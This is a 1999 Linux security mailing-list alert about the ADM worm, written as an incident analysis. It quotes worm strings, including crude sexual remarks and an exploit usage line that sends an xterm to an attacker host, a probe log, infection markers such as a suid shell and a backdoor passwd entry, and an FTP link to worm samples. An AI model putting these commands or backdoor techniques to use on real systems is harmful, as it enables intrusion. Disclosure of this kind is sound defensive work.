@@ -1,0 +1,215 @@
+FROM: Jan-Philip VeldersDATE: 03/26/1999 01:59:54SUBJECT:  [linux-security] *ALERT*: ADM Worm. Worm for Linux x86 found in wild. 
+-=> To moderator:
+I don`t know whether it`s wise to release the FTP-location
+I would recommend everyone to just look over their daemons, and run
+something like nessus against theirselves...
+
+Greetings,
+Jan-Philip Velders
+
+---------- Forwarded message ----------
+Date: Thu, 25 Mar 1999 16:26:59 -0700
+From: "Ben Cantrick (Macky Stingray)" <<EMAIL: PROTECTED>>
+To: <EMAIL: PROTECTED>
+Subject: ADM Worm. Worm for Linux x86 found in wild.
+
+1. Summary
+
+  On the week of 3/7, a polite mail from a system administrator at a
+company in Russia tipped me off to one of our Redhat boxes portscanning
+one of their subnets. Subsequent investigation found that a worm had
+infected the offending box and was attempting to propagate itself.
+
+2. Further info
+
+  The worm seems to be a few binaries working together with some
+bourne shell scripts. The main file seems to be one called "admw0rm,"
+which is a shell script and not a binary.
+
+  Identifying strings found in the files include:
+
+-----admw0rm-----
+
+#!/bin/sh
+# ADM Inet w0rm
+# Linux X86 spef..  anyway it`s my first w0rm :)
+# ver 0.1
+# i`m not responsable of the usage of diz w0rm !!!
+# greetz: to  all blondes with the short hairs who look`s good =), the netg
+# sistah, all of the handrail`s i`ll slide, all of the sweden chix i`ll fuk ;)
+# and The ADM Crew oooooooofffffff course heh
+#          LIFE IS A BITCH, BE HARDCORE WITH `EM, DONT FINISH LIKE ME !
+# ********************* THE CREW WILL NEVER DIE ***************************
+
+EMAIL="<EMAIL: PROTECTED>"
+SAY="The ADM Inet w0rm is here !"
+
+-----Hnamed----
+
+--= The ADM CreW =--
+%s victim arg0 arg1 ...
+ex:sploits http://www.juergen.ch /usr/X11R6/bin/xterm -display ppp666.hax0r.com:0
+
+-----
+
+  The worm is particularly amusing in that when run, along with
+portscanning, wiping logs, and all the other usual things you`d expect
+a worm to do, it also hunts for files with a .html suffix and inserts the
+contents of the "SAY" variable (above) into them, over-writing whatever is
+there.
+
+  Other infection symptoms include a ".w0rm0r/" subdir and suid root copy
+of /bin/sh named ".w0rm" in /tmp, and possibly a
+"w0rm::2666:777:ADM Inet w0rm:/:/bin/sh" entry in your passwd file.
+
+  As far as I can tell, the worm is capable of detecting several well-known
+vunerabilities. The logs the Russian company sent us, and the logs that the
+worm itself kept, would seem to indicate it`s scanning IMAP ports. It
+also seems to be scanning POP, rsh/rlogin, telnet and FTP ports, finger,
+gopher, etc...
+
+  Once it`s into your system, the worm presumably begins to scan and look
+for vunerable machines again. How it picks the IP addresses to scan is not
+presently known to me. Presumably, the "gimmieip" binary takes care
+of that. Someone with more time can dissect it and post the results.
+
+  Here is a file I found on the infected machine called "/tmp/outro" - it
+appears to be a log that the worm kept as it probed some system.
+
+-----
+
+Load the config file...
+Mail Test
+CGI Test
+Telnet Test
+Xwin test
+Samba test
+RPC test
+Imapd Test
+Ftp Test
+Ftp test: root writable test
+Ftp test:ftpsearch
+Config loaded...
+#############################################################################
+scan of XXX.XXX.XXX.XXX		[IP obscured to protect the guilty. -Ben]
+----  port open ----
+port 109 open
+port 110 open
+port 111 open
+port 113 open
+port 143 open
+port 21 open
+port 23 open
+port 37 open
+port 513 open
+port 514 open
+port 70 open
+port 79 open
+FTP IS OPEN! Port: 21
+is not a ftpd
+TELNET IS OPEN! Port: 23
+-- telnet --
+
+Red Hat Linux release 5.2 (Apollo)
+Kernel 2.0.36 on an i586
+
+FINGER IS OPEN! Port: 79
+finger: .: no such user.
+
+finger: search.**: no such user.
+
+
+ >>> Fingering all userz <<<
+[List cut to protect the guilty. -Ben]
+
+>>> Fingering guest account <<<
+finger: guest: no such user.
+
+
+>>> Fingering bbs account <<<
+finger: bbs: no such user.
+
+
+ >>> Fingering root account <<<
+Login: root           			Name: root
+Directory: /root                    	Shell: /bin/bash
+On since Mon Feb 22 08:03 (EST) on tty2   9 seconds idle
+     (messages off)
+No mail.
+No Plan.
+
+POP3MAIL OPEN
+PORTMAPPER IS OPEN
+   proggie verz pr0t0   da port
+    100000    2   tcp    111  rpcbind
+    100000    2   udp    111  rpcbind
+IMAP IS OPEN
+the imapd is overflowable !
+rlogind is here
+rshd is here too
+
+-----
+
+3. Prevention and Disinfection
+
+  At first glance, it would appear that this worm would seem to rely on
+well-known vunerabilities, particularly buffer overflows of SUID root
+daemons. If this is indeed the case, prevention would seem to be as simple
+as making sure you have the latest versions of your daemons.
+
+  You do keep your daemons up to date, don`t you? You do read Bugtraq and
+CERT to know which ones are vunerable, don`t you? Of course you do! You`re
+a good system administrator! You stay on top of things like that! You
+obviously have *nothing* to worry about.
+
+
+  As far as disinfection, I have not had time to work up a disinfection
+procedure. It could be as simple as rebooting to single-user and deleting
+all the worm`s binaries out of /tmp, where it seems to keep them. On the
+other hand, I`m not going to say anything for sure because I haven`t
+had time to do my homework and properly toy with this thing and figure
+out how it works.
+
+
+4. Where you can get a copy to play with
+
+  I hesitate to release an even partly intact or even moderately functional
+version of this worm, because I`m sure that the script kiddies will eventually
+get their hands on it, no matter how hard I try to filter requests. So, I`ve
+decided to throw it out with no restrictions. I`m releasing as much of the
+worm as I have, which I estimate to be about is about 75-90% of the it, to
+the wilds of the net via Bugtraq. Call me irresponsible if it makes you
+feel better. But I honestly think that the best way to make vendors get off
+their asses and repair vunerabilities is to publish them widely so that it`s
+either fix the holes NOW or get rooted. (I should note at this point that
+I found the worm on a Redhat 5.2 box. Are you running Redhat 5.2?)
+
+  The files I have can be retrieved at:
+
+ftp://ftp.ronin.net/pub/admworm/admworm.tgz
+
+  This FTP server is on a low-speed line, and there is a 5 user
+simultanious limit. Keep trying. I assume someone will mirror the files
+to a faster server and announce the location here on Bugtraq for everyone`s
+enjoyment.
+
+
+  As for me, I`m rather busy at work. This worm is more of an intellectual
+curiosity for me than anything else, as it seems to be mostly benign. I`d
+appreciate it if nobody would bug me about this any further, please. You
+know where to get samples, and after reading this mail you know as much
+the worm as I do.
+
+
+          -Ben
+--
+Ben Cantrick, <EMAIL: PROTECTED>
+"Pathological techno-fetishist with social deficit" at large.
+Net.ronin, philosoph and garbageman.
+
+-- 
+Please refer to the information about this list as well as general
+information about Linux security at http://www.aoy.com/Linux/Security.
+
+To unsubscribe:
+  mail -s unsubscribe <EMAIL: PROTECTED> < /dev/null
